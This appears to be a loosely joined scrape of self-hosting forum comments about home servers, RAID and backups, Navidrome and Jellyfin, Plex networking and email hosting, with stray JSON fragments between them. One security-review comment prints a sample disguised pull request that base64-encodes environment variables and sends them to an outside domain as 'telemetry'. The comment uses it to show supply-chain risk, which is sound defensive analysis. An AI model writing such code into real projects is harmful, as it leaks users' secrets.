We have the proxmox community lxc scripts which are very good but still it does not handle everything, plus doing the upgrade and all. I still use two applications as lxc i.e. pihole and tailscale. For the docker I created an ansible script for handling the upgrade part.\n\nOne mistake that I have done is I have truenas and debian as my VM. I just using truenas for setting up the RAID, backup, storage related. Nothing else I really use in truenas. I could have used truenas for my application setup as well but it was k8 based when I started now they have changed to docker. Or I could have done the other way around to get rid of truenas and just maintain the health checks, raid, backup manually from my debian.",

It's incredible what these machines can do.\n\nMy company is ISO 27001 and SOC 2 compliant, so getting the details right to be able to launch this was a bit of a project.\n\nI'm happy to share more and answer any questions folks may have.

Need to do this. In the meantime, the tl;dr is you set up all transcription requests to go into a queue. Then you set up the Macs to read requests from the queue, perform the transcription work, and save the results. Then you set up an autoscaler in AWS to monitor the number of messages waiting in the queue. You can have the number of cloud instances idle low (or zero), so then if the Mac cluster were to go offline, the autoscaler fans out and the cloud takes over.   \n  \nSo this way you still have the resiliency of being in the cloud, but the spend only kicks in if your on-prem cluster goes offline.",

Unraid has good raid storage options, so does cosmos cloud. You just need 1 parity, maybe one day if your more than 4 drives you can do 2. I use cosmos cloud and unRAID, which both use fundimentally same concept and it's very easy to setup. Basically 1 backup drive, but has to be the largest. \n\nHowever! Recommend setting up something like ironmount, which I think has been renamed? But it's a nice compression style backup, letting you backup to an external hard drive. I recommend an SSD if your putting it in your car due to moving a lot. \n\nThose are my opinions. Hope this helps, two easy steps. Been using jellyfin+immich +70 other containers for years now and have never had an issue. Except cheap sata controllers, don't use them!! \n\nGood luck!",

          "text": "When deciding if you want to use a raid configuration (e.g., mirroring / RAID 1), ask yourself if you need **redundancy**. That is, if the drive failed, how sad would you be? Could you rebuild? Could you endure the downtime? Would the disruption materially impact you? Redundancy in a self-hosting situation at home is often about the convenience of not having to sit down and rebuild everything (be it the OS or data) or restore backups.\n\nRedundancy become more and more important as you add drives. For each drive you add, the more likely it is that one will fail. This can be where we choose more between various configurations (RAID 5, 6, 10, etc.), and it's where you start sacrificing one or more drives worth of space for parity, allowing you to function through the loss of a drive. Different configurations have their own pros and cons, which can include the number of drives they can survive losing as well as read/write performance.\n\nBesides redundancy, also consider your **backup** situation. RAID won't help you to restore a deleted file, for example, or one hit by ransomware. A commonly advocated gold standard is the 3-2-1 rule, in which you have 3 copies of data (the original and two backups), on 2 different media, with 1 copy being in a different physical location (often the cloud, these days, but sometimes a friend or family's house). But at least have a backup somewhere, preferably on a different disk in a different computer. Then you can have the fun of asking yourself how much redundancy your backups need!\n\nHow much you stick to a strategy like 3-2-1 depends on how important the data is to you. Does it need to survive a catastrophic hardware failure (what if both drives in a mirror fail, or what if the entire computer gets fried or stolen)? Does it need to survive the house burning down? That may or may not be a concern.",

I would address this with good practices like not deleting from photo source for a week and copy your\"important stuff\" to a backup drive every day. That way if the HDD did die you lose nothing but time for the RMA. \n\nBackup: external HDD is the easiest, how big depends on the photo count and type you're gonna host. Typical adult with phone camera, 1TB would last a while. Photographer with RAW pictures, videos, teenage kids or selfie obsessed spouse, and many family members using starts pushing towards a higher need. Biggest thing with the backup is if you only do one, I would have a routine to backup each day and unplug it after. Every time I've lost a drive (other than one DOA), I could relate it to a power issue, or dropping it. Since we aren't dropping anything just protect the power by not powering it when not copying. If you want to automate this get a big external that needs power from the wall and plug it into a smart plug just be careful you don't have it cutting power while the drive is actively being written to.",

Automatic and periodical data scrubbing with self-healing capability (Bit Rot Protection) - Hence a \"striped\" based RAID on a capable file system (ex: ZFS)\n2.

Some will say RAID is for uptime, true ... but it's also for \"resilience\" aka \"recover from backups only in catastrophic events / total failure\".\n\nRAID 6 will give this \"resilience\" to your main vault, as much as possible without backup restores. Of course, you ABSOLUTELY need backups besides RAID (the old saying \"raid is not backup\").\n\n3. Automatic Backups On-site and Off-Site - manually shuffling hard drives and manually performing \"cloning\" between them is not a robust backup solution for a big list of reasons.\n\n4.

Unless you exactly know what you're doing, you will be stuck with whatever drives you throw in a RAID. With RAID-Z you can expand a mirror by just throwing in a larger drive and resilvering. Don't know, if that works with other classical RAID modes, and I only have done it once.\n\nI run a VPS with 10TB Storagebox on Hetzner and it saves me a lot of headaches. \n\nPlaying around with hardware is fun and stuff, but the administrative overhead and costs have to be taken into account. too. \n\nIf you are worried about privacy, rclone can encrypt your stuff. If you are worried about redundancy, put a small nas at home for mirroring. \n\nYou don't have to run a nas with RAID 6 only to backup your family photos.\n\nFamily photos are mostly static and can be frozen on a cold storage or other drives much cheaper. Just don't rely on just one media type. Look up desaster recovery plans and 321 Backup strategy If you constantly add photos, Immich may be something for you. Otherwise, onedrive, google photo etc are your friend for these. \n\nSince you already have a whopping 24TB at hand, I'd buy another one and spin up a TrueNAS, OMV or unraid. You can run \\*arrs on there quiet easyly. TrueNAS core only supports BSD Jails, so take this with a grain of salt :D It works, but it's not the fancy docker compose [monster](https://github.com/theniwo/servarr/blob/master/docker-compose.yml) you may end up with.",

Stuff disappearing, recommendations getting worse, the app turning into a podcast and AI promo machine instead of a music player.\n\nAround a year ago I started reading about Linux. Not installing yet, just reading. I knew I didn’t want to rush it and end up frustrated, so I took my time trying to actually understand how things work.\n\nAt the same time, Windows was starting to feel… weird. AI features everywhere, things changing without asking, more stuff running in the background than I was comfortable with. My computer stopped feeling like a tool and started feeling like a service I didn’t sign up for.\n\nEventually I made the jump.\n\nI’m on Debian now, keeping it simple and stable. Free software only where possible. I also went all in and Librebooted my hardware, which honestly felt great. No opaque BIOS junk, no mystery firmware before the OS loads. It’s boring in the best way.\n\nThe big win for me was music.\n\nI set up Navidrome and pointed it at about 2 TB of music I’ve collected over the years. My files, properly tagged, lyrics embedded, no ads, no algorithms. It just works. I can stream from any device, anywhere, and it feels like having my own private Spotify but without the nonsense.\n\nThis wasn’t a weekend project. I moved slowly, learned the basics, figured out backups and networking first. I wanted something that would still work a year from now without babysitting.\n\nOnce that was running, something clicked. If I can host my own music this easily, why am I outsourcing so much of my digital life?\n\nI’m not trying to be hardcore or preachy about it. This just feels calmer. More in my control.\n\nCurious if anyone else here dropped streaming services or Windows and ended up down the self-hosting rabbit hole too.",

Also buying albums gets very expensive in the long run. I like that I can try some artists on Spotify before I commit and buy their albums on vinyl (usually get a digital download with this too).

My partner's been hosting movies and tv shows for some time now, but the switch to music has really encouraged me to want to dedicate more time to get our server more functional and spin up more services.

I wonder if that was a result of an \"algorithm\" that was being fed contextual data about you from outside the context of spotify that led it to think that was what your preferences were... or if they were simply pumping in more features/content and the volume of new content got pushed onto users intentionally/inadvertently? My question to you, however, is whether you found this offensive because it broke your expectations of how you use/used spotify (ie. I curate spotify heavily, I use spotify to loosely generate playlists for me, I just want noise in the background that matches my preferences, I have certainly general daily routines and will try to seek music that matches my expected energy/mood). I'm just curious because I'm working on an personal project that is kinda trying to address that - at least from my perspective, so getting feedback from someone else is helpful if you don't mind. Especially when you are being so public about it 😂 and, I am a solo dev, not a marketer or whatever person doing market research rest assured fyi.",

Just sometimes you need to build your own thing.\n\nFor example, I personally have the mindset and philosophy of going as barebones as possible in dependencies, like 3rd party imported libraries. While sometimes they are fine, often they are some FOTM iteration and a big moving target that forces you to lockin build versions and even worse, have to double check new releases because so much contributor vibe coded slop these days is wrecking various dependencies (not always with good teams but often) and will break your project. Not relying on 3rd party stuff means less pitfalls down the road. Even if all of those are stable, it's sometimes just personal preference to want to control the code bloat of dependencies.\n\nI don't know OP's reasoning for this, but often it's also just a choice of preferring to work in their own dev environment and software architecture design than be forced to learn the many dependencies of an existing project.\n\nOther times it is about control over the project. They want to release something better, or not even better, just different to their own preference. Software devs are notoriously ego maniacs and can be challenging to collaborate with. Probably not the case here if you say they are anxious for additional support, but you open yourself to the risk of putting in a bunch of effort into a project that might not be appreciated and you don't know the owner of the project, so it's just easier to avoid and build your own thing.\n\nAnd sometimes it is just purely a project for yourself because you want to learn how to do something yourself too, which is how most of my projects are. I could just fork something and add to it, send my pull request, but I'd really like to build a project from scratch in that tech stack to really get to learn it.",

So we have the complexity of a stable project, without it being stable. Now Stingray's far from perfect, it *just* v1.0.0 (I haven't even put it in the release page yet because Apple only just approved it), and people are already reporting crashes, which sucks! But in my mind, Swiftfin's not much better since it frequently throws a big error at me when I load my personal Jellyfin library.\n\nAlso I have a big ego muhahahahhahaha",

Like really hot. While I'm testing, I have yet to see my Apple TV drop down from a serious thermal state. Not to mention, I don't think they have much for hardware encoders on them to begin with. With that in mind, Stingray relies on the server to do transcoding since Jellyfin already has a great setup for it over the API. This helps with performance, thermals, storage, and memory. The current generation of Apple TVs only have about 4GB of memory available (according to Xcode), and a good 1.2GB or so is typically tied up with \"Other Processes\".",

My biggest issue with Swiftfin is that it doesn’t see my music, I'm really glad yours works work with music.\n\nJust a question, as a total noob when it comes to codecs, when I play pretty much anything from my library via Swiftfin, I see in the Jellyfin control panel that it is using direct play, because the client is fully compatible with the file. I like seeing that, because my server is pretty weak so I like not having to do any kind of live transcoding. However, with Stingray, everything in my library says that it’s being transcoded. Does this mean Swiftfin has better compatibility/supports more codecs than Stingray? Do you have plans to bring that support up to Swiftfin's level?",

In practice, a lot of homelab gear - especially small servers, NUCs, and various Chinese or whitebox boards - simply doesn’t. And even when BMC is available, it’s not always something I want to depend on for last-resort recovery.\n\nSo I ended up building a small, dedicated hardware device for headless maintenance that I now keep in the rack as a “break glass” tool.\n\nhttps://preview.redd.it/fz7s735g8rdg1.png?width=2560&format=png&auto=webp&s=9f7f8950b28cc29811c8aaa554eac9c58b8a6a8d\n\nThe first part is BIOS-to-Text. The device sits inline on HDMI and, instead of treating the signal as a video stream, it reconstructs what’s on the firmware screen and exposes it as an ANSI text interface over SSH. It’s intentionally focused on firmware and pre-OS environments rather than general-purpose graphics. From a terminal, I can navigate BIOS menus, read POST output, copy error messages, or script pre-OS workflows without dealing with video latency or blind keystrokes.\n\n[The output isn’t a framebuffer. It’s a pure ANSI text stream served over SSH](https://preview.redd.it/zid7f1oj8rdg1.png?width=2560&format=png&auto=webp&s=3bb5f62b6a06c28cdea735054d8782b262954ccf)\n\nThe second part is recovery. I integrated a local storage layer based on Btrfs that presents itself to the host as a normal USB drive, but internally keeps immutable, read-only snapshots. This is not meant for snapshotting an OS or doing live rollbacks. I use it purely as a resilient container for ISOs, rescue environments, and recovery scripts. Even if the host is compromised or wipes the drive, previous snapshots remain intact and readable, so recovery media doesn’t disappear when you need it most.\n\nhttps://preview.redd.it/wec75zv3crdg1.png?width=2000&format=png&auto=webp&s=5d90c811d8b5c7b39c177ff05331f44158759c25\n\nThe goal wasn’t to replace existing KVMs or BMCs, but to have a reliable last-resort device that works without agents on the host, without relying on the OS, and without assuming the network or firmware stack is in a healthy state. It’s the thing I reach for when everything else has already failed and I just want my weekend back.\n\nI’ve been documenting the build and experiments as a personal devlog over at r/USBridge if anyone is curious about the internals.",

To be clear: this isn’t trying to turn fully animated GUIs into a terminal movie.

For those (and simpler graphical UEFIs), it works reasonably well.

I honestly didn't expect this level of reception.\n\nSince a few people asked about the hardware and availability: I'm currently finalizing the pre-production prototype (based on the RK3566). I don't want to spam the sub with sales links, but if you are interested in following the development or grabbing a unit when it's ready, I have a 'Notify me' page up on Kickstarter: [**https://www.kickstarter.com/projects/usbridge/usbridge-offline-kvm-with-bios-automation-and-snapshots**](https://www.kickstarter.com/projects/usbridge/usbridge-offline-kvm-with-bios-automation-and-snapshots)\n\nI’ll keep posting technical updates here as progress continues. After that, I plan to break down another core feature: file-level snapshots built on top of Btrfs.",

Some things to be aware of:\n\n**The big ones:**\n\n* Default deployment uses `network_mode: host` so the container gets full access to the hosts network stack. if anything goes wrong, attacker has line-of-sight to whatever's exposed on your network.\n* The proof-of-work is 4 hex characters. A GPU generates \\~1,500 valid identities per second. All the rate limiting is per-identity, so it's effectively meaningless.\n* Your IP goes to every peer you connect to. If the map is enabled, the client also sends all peer IPs to ipwho.is for geolocation. Third party now has a list of everyone running this.\n* P2P buffer has no size limit `socket.buffer += data`. Any peer can OOM your node by sending data without newlines.\n* Ed25519 public key is broadcast on every heartbeat, can't be rotated. Permanent identifier.\n* Runs as root, no USER in Dockerfile.\n\n**What's actually fine:** XSS is handled correctly (HTML escaped before markdown), no eval/exec anywhere, prototype pollution is blocked, deps are clean.\n\n**Supply chain risk:** Project accepts contributions and uses `:latest` tag. A malicious PR could look completely innocent. Example of what passes casual review:\n\n    // PR titled \"feat: add debug logging for peer connections\"\n    const logPeerDebug = (socket, identity) => {\n      const info = { peer: socket.peerId, node: identity.id, env: process.env.NODE_ENV };\n      if (process.env.HYPERMIND_TELEMETRY !== 'false') {\n        require('https').get(`https://hypermind-analytics.io/v1/log?d=${Buffer.from(JSON.stringify(info)).toString('base64')}`);\n      }\n    };\n\nLooks like opt-out telemetry. Reviewer sees `NODE_ENV` and thinks \"debug flag.\" Doesn't notice `process.env` can be expanded to exfiltrate all environment variables to an attacker-controlled domain.\n\n**If you're going to run it anyway:**\n\n* Bridge networking, not host\n* `ENABLE_MAP=false`\n* Resource limits\n* Isolated network with no access to internal services\n* Pin image version\n\nNot saying don't use it, just know what you're deploying.",

      "text": "Boy do I feel silly.  About a year ago, I did a substantial rearchitecture and upgrade of my home services and network configuration.  It touched on everything from running a hetrogenous Docker cluster to how I scanned receipts to automation around lighting.\n\nSo many things needed tweaking that although I noticed about a week later that videos served through Plex were looking kind of grainy, I took a really quick look at the settings, didn't see anything obviously wrong, and chalked it up to \"well, I upgraded both Plex and the Apple TV, there's probably some other setting I need to tweak\".  It went onto my \"todo eventually\" list (so I promptly forgot).  I mainly use Plex for streaming my music to PlexAmp, so video hasn't been a priority for me.  Until I tried to get things set up for my daughter to watch some shows I downloaded for her.  I was like, \"I took extra time to download HQ renditions of this stuff, why does this look like ass?\"  Checked it in VLC, and it looked perfect.   \n  \nThen I looked at Playback settings, and despite the global setting being to \"play original\" locally, once I started the video, it was set to 480p!  I tried checking \"play original\", but it just immediately snapped back to 480p. \n\nSearching this issue led to the suggestion to check the \"Network > Relay\" setting, and to monitor the dashboard while watching and see if it was streaming locally or remotely.  Sure enough, it was remote, and my Relay setting was indeed turned on:  \n  \n*\"The Relay allows connections to the server through a proxy relay when the server is not accessible otherwise. Note: this proxy relay is bandwidth limited.\"*\n\nI disabled the Relay, and then couldn't get to any of my media, which I thought was really weird since the server was local and configured to use the correct IP and port.  Then I remembered...  \n  \nAnother part of my upgrade was to reconfigure the UDM Pro to have a separate \"devices\" VLAN, primarily for IoT devices.  My Apple TV also lives on that network.  My Synology, which hosts the Plex server, lives on the secure VLAN.  My firewall rules explicitly forbid device traffic from hitting the secure network.\n\nIf I had no access to the media from the start, this would have been obvious, but the relay setting hid the mistake from me, and allowed things to seem to \"work\" by streaming everything remotely!\n\nI fixed the firewall rules, but also discovered that Plex still thought that it needed to go remote because of the different networks; Plex lived on 192.168.1.x and the AppleTV was on 192.168.2.x.  So, I also had to change the \"local networks\" setting (to 192.168.0.0/16 in my case).\n\nEverything plays locally again and I'm able to handle HD video from the fairly low-spec Synology fine, although it does seem to struggle a bit adding subtitles.\n\nAnyway, this is a pretty niche misconfiguration, but hopefully it will save someone a few minutes someday.",

Roughly.\n\nIf you're using your own reverse proxy (eg nginx, to access your instance via plex.yourdomain.com) you actually need to  \n\\- **disable remote access**  \n**- add that url to \"custom url\" in \"network\"**  \nOther than for authentication, this doesn't use any Plex infrastructure at all to stream your data, as it's fully done with the public DNS of your domain and the reverse proxy.",

And even if you don't give a company access to YOUR inbox or sent mails, all those messages are in those real people's inboxes and sent mails. And I highly doubt that everyone you send emails to is also selfhosting their email server, so guess what, all your messages can be accessed by those companies you worry about so much.\n\nIf you don't PGP your message, it's like an open postcard whether you selfhost or not. And if you PGP, it basically doesn't matter whatever you use as your provider of if you selfhost. Only other solution that doesn't involve getting everyone to use PGP is getting everyone you care about to use something like Protonmail where all messages sent between its users are automatically encrypted.\n\nIf you worry about profiling by your online purchases or where you're registering with your email, that's also very hit or miss (more miss), because nowadays very few companies or websites you can register to are hosting their own email, so whatever they send you will probably also come from a Microsoft/Google account, just obfuscated by a custom domain. So, again, you're not protected by your own email server.\n\nSelfhosting email has a net 0 privacy benefit, and you'll just get an aneurism when a most important official email you sent just won't get through some relay, gets deleted by an overactive malware detector, or just lands in a Spam folder because you insisted on selfhosting.",

              "text": "No internet requirement; internet goes down and your camera network keeps chugging. No big brother keeping your video feed. No company accidentally making money training vision models on your video. \n\nJust, for the love of god, don’t forward your admin port to the internet when there’s an authentication port meant for that. \n\nEdit: One drawback to self hosting your NVR is the whole “watch your cameras from outside your home” thing becomes your problem. The easiest and absolutely worst way to do this is to go into your router and forward the NVR’s or IP camera’s admin port to the internet. Sure, you can now see your cameras from outside your home, but so can everyone else. Some NVRs don’t have the admin port behind any default user/password authentication to make it easier inside your network. They have dedicated ports which have authentication built in. \n\nSo how do you do it? You can forward the authentication port so Joe Blow only sees a login page. (I dont like this one as you’re connecting directly to your public IP.) Or you can put your NVR behind a reverse proxy and add an authentication layer yourself with something like Authelia or Authentik which also sends Joe Blow to a login page. A reverse proxy can also support other helpful stuff like blocking IPs from certain geographic areas and known malicious IPs. It cuts down on pings from Russia, for example. Also also a reverse proxy uses a domain which you host through Cloudflare or someone else which means you can piggyback off their own security features. ",

I haven't touched mine in years. The last time was due to a security vulnerability in the software I was using, although the issue didn't relate to my configuration.\n\nIP reputation plays a big role. If your address is flagged as being within a residential range or you're hosting on a cheap VPS environment along with bad actors, you will struggle to get e-mail delivered. On the other hand, if you have a good ISP that caters to more advanced users or business customers, you shouldn't have a lot of trouble. E.g. I changed ISP recently and found the IP range was listed incorrectly in Spamhaus. It wasn't a major issue as my domains have good reputation, but I contact them and they had it corrected quickly.\n\nI think user expectation plays a role in the perception of e-mail hosting being difficult. I don't run \\_any\\_ spam filters, because I don't trust them (I wrote statistical spam filters in my first job). You will never win if you want to stop all spam, but keep in mind that while GMail and Outlook may stop more spam (with a large degree of arrogance IMO), they will also block more legitimate e-mail in doing so.",

I want a setup that lets me manage my own library but still keeps some of the *discovery* features I’m used to from streaming services.\n\nFrom what I understand so far, **Navidrome** seems like the best core solution for this. I’ve seen that it supports lyrics (even synced/karaoke-style in some clients) and has a “radio” feature based on my own library.\n\nWhat I’m still not fully clear about is the **recommendation/discovery side**:\n\n* Is there any way to get recommendations *based on my listening habits*, similar to Spotify’s daily mixes or weekly discovery playlists?\n* More specifically: can it suggest **music I don’t already own** (artists/albums/tracks outside my library), so I can then look them up and decide whether to buy or add them?\n* Are there plugins, integrations or external tools that people commonly use alongside Navidrome to cover this gap?\n\nI’m constantly searching for new music, so discovery is important to me. I don’t expect a 1:1 Spotify replacement, but I’d like to know what’s realistically possible in a self-hosted setup and how others handle this.\n\nWould love to hear how you’ve built your workflow and what clients or services you pair with Navidrome.\n\nThanks!",

If a song you're searching is on your Navidrome server, then it forwards that song to the client. If not, my fork queries SquidWTF and forwards the FLAC file to the client.

          "text": "I've been using local music for a while now, downloaded to a server that connects to my phone. Everything was fine, but I was missing that external connection to search for recommendations and such. I used Spotify Free on my PC, but only occasionally. So I was stuck in a rut when it came to exploring more.\nSo today I transferred all my songs from Spotify to YouTube Music, and then connected my YouTube Music account to an app to have both my local music and occasionally check for new releases. All of this without paying. I'd prefer not to depend on a service like YouTube Music, but so much music is available through it. So at least I'm not paying for it.",

It would be 100x more worthwhile if you dedicated those hours and energy to something meaningful, like volunteering at animal shelter or dpending time with your family in nature. But that's just like my opinion man.",

          "text": " 1. Bro, don't use FLAC, it takes up way too much storage space and upload bandwidth. Use the Opus format at 192 bit. If you really want high end, then go for 250 or 320 bit, but you don't need it. 192 is enough with Opus, it sounds like FLAC!\n2. I would recommend Jellyfin, self-hosted😉",
